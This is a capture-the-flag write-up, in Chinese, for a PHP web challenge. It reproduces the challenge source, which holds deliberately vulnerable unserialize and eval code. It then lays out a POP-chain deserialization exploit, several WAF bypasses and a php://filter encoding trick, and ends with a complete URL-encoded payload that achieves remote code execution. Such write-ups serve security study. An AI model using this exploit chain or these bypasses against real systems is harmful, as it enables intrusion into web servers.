# ctfshow easy_web

## 1、源码

```
开胃小菜，就让我成为签到题叭 <?php
header('Content-Type:text/html;charset=utf-8');
error_reporting(0);

function waf1($Chu0){
    foreach ($Chu0 as $name => $value) {
        if(preg_match('/[a-z]/i', $value)){
            exit("waf1");
        }
    }
}
 
function waf2($Chu0){
    if(preg_match('/show/i', $Chu0))
        exit("waf2");
}
 
function waf_in_waf_php($a){
    $count = substr_count($a,'base64');
    echo "hinthinthint,base64喔"."<br>";
    if($count!=1){
        return True;
    }
    if (preg_match('/ucs-2|phar|data|input|zip|flag|\%/i',$a)){
        return True;
    }else{
        return false;
    }
}
 
class ctf{
    public $h1;
    public $h2;
 
    public function __wakeup(){
        throw new Exception("fastfast");
    }
 
    public function __destruct()
    {
        $this->h1->nonono($this->h2);
    }
}
 
class show{
    public function __call($name,$args){
        if(preg_match('/ctf/i',$args[0][0][2])){
            echo "gogogo";
        }
    }
}
 
class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
    public function __construct(){
        $this->chu0 = 'xiuxiuxiu';
    }
 
    public function __toString(){
        echo "__toString"."<br>";
        if ($this->chu0===$this->chu1){
            $content='ctfshowshowshowwww'.$_GET['chu0'];
            if (!waf_in_waf_php($_GET['name'])){
                file_put_contents($_GET['name'].".txt",$content);
            }else{
                echo "绕一下吧孩子";
            }
                $tmp = file_get_contents('ctfw.txt');
                echo $tmp."<br>";
                if (!preg_match("/f|l|a|g|x|\*|\?|\[|\]| |\'|\<|\>|\%/i",$_GET['cmd'])){
                    eval($tmp($_GET['cmd']));
                }else{
                    echo "waf!";
                }
 
            file_put_contents("ctfw.txt","");
        }
        return "Go on";
        }
}
 
if (!$_GET['show_show.show']){
    echo "开胃小菜，就让我成为签到题叭";
    highlight_file(__FILE__);
}else{
    echo "WAF,启动！";
    waf1($_REQUEST);
    waf2($_SERVER['QUERY_STRING']);
    if (!preg_match('/^[Oa]:[\d]/i',$_GET['show_show.show'])){
        unserialize($_GET['show_show.show']);
    }else{
        echo "被waf啦";
    }
}
```

## 2、解题思路

* 思路很清晰，一个POP链，绕过三个WAF，一个正则，一个__wakeup，然后写shell进文件，最后经过正则后RCE，POP链，比较简单，但是有坑

```
ctf() __destruct -> show() __call -> Chu0_write __toString
```

## 3、步骤

* 

```
<?php
 
class ctf{
    public $h1;
    public $h2;
 
}
 
class show{
 
}
 
class Chu0_write{
    public $chu0;
    public $chu1;
    public $cmd;
}
 
$a=new ctf();
$a->h1=new show();
$a->h2=[[2=>new Chu0_write()]];  //注意这里的参数是ctf()的h2
                                 //__call($name,$args)中的$args已经是一个数组,所h2只用嵌套两层即可
 
echo serialize($a);
```

### 1、第一层warf

* waf1就是我们传递的参数值中不能含有a-z和A-Z，由于$_REQUEST的传参中POST的优先级比GET高，我们可以POST复制传递题目让我们GET的参数，waf1就会匹配POST的数据而忽略GET，从而绕过

### 2、第二层warf

* waf2就是让我们GET传参中不能含有show，可是不论是参数还是POP链中都有show，这时我们就可以url编码绕过，注意这里还有个隐藏考点就是我之前讲过的传参规则，`show_show.show`需要写成`show[show.show`

根据上述思路传参后，成功进入到toString内，代码提示用base64，联想到`php://filter`的伪协议，用`php://filter/convert.base64-encode/resource=ctfw`，让原来的内容乱码，从而执行我base64写入的方法，但是本地测试后发现不行，原因是因为他这里是将文件的内容当成一个函数，前面数据无论是什么，在拼接你写的内容后PHP都无法识别这个函数从而报错，除非前面的内容是比如php，你在后面拼接info，最后内容是phpinfo()，这时是PHP定义了的函数，语法上才不会报错，才会执行

### 3、toStrting内容注入

* 可以让原来的内容即ctfshowshowshowwww，经过filter里的过滤器过滤后，变成不是base64里面可编码的字符比如 #@等，再将我们要执行的方法比如system，进行利用iconv进行utf-8(因为我们现在是utf-8编码)转成任意filter支持的字符编码(比如utf-16)

```
<?php
 
$b ='system';
 
$payload = iconv('utf-8', 'utf-16', base64_encode($b));  //utf-16这里可以换成任意filter支持的字符编码
 
file_put_contents('payload.txt', quoted_printable_encode($payload));  
//quoted_printable_encode这就是个特殊编码,目的只是为了可视化，因为编码后会乱码，
                                                                              
//应该也可以用urlencode($payload)，但是urlencode($payload)我本地测试是可以的，但题目环境不行
 
$s = file_get_contents('payload.txt');
 
$s = preg_replace('/=\r\n/', '', $s);
 
echo $s;
```

* 然后利用php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw，这就是个求逆的过程，把我们convert.quoted-printable-encode进行decode，convert.iconv.utf-16.utf-8 将utf-16转回utf-8，最后convert.base64-decode进行base64解码，我们的写入的数据就恢复成system，而之前的内容即ctfshowshowshowwww，会在/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8后乱码并且无法进行base64解码，这时/convert.base64-decode/就会过滤掉非base64字符把原来的数据清空。最后打印环境变量即可得到flag

## 4、最终payload

```
GET：?%73%68%6f%77[%73%68%6f%77.%73%68%6f%77=%43%3a%31%31%3a%22%41%72%72%61%79%4f%62%6a%65%63%74%22%3a%31%36%34%3a%7b%78%3a%69%3a%30%3b%61%3a%31%3a%7b%73%3a%39%3a%22%67%78%6e%67%78%6e%67%78%6e%22%3b%4f%3a%33%3a%22%63%74%66%22%3a%32%3a%7b%73%3a%32%3a%22%68%31%22%3b%4f%3a%34%3a%22%73%68%6f%77%22%3a%30%3a%7b%7d%73%3a%32%3a%22%68%32%22%3b%61%3a%31%3a%7b%69%3a%30%3b%61%3a%31%3a%7b%69%3a%32%3b%4f%3a%31%30%3a%22%43%68%75%30%5f%77%72%69%74%65%22%3a%33%3a%7b%73%3a%34%3a%22%63%68%75%30%22%3b%4e%3b%73%3a%34%3a%22%63%68%75%31%22%3b%4e%3b%73%3a%33%3a%22%63%6d%64%22%3b%4e%3b%7d%7d%7d%7d%7d%3b%6d%3a%61%3a%30%3a%7b%7d%7d&name=php://filter/convert.quoted-printable-decode/convert.iconv.utf-16.utf-8/convert.base64-decode/resource=ctfw&chu0=c=003=00l=00z=00d=00G=00V=00t=00&cmd=env

POST：show[show.show=1&name=1&chu0=1&cmd=1
```

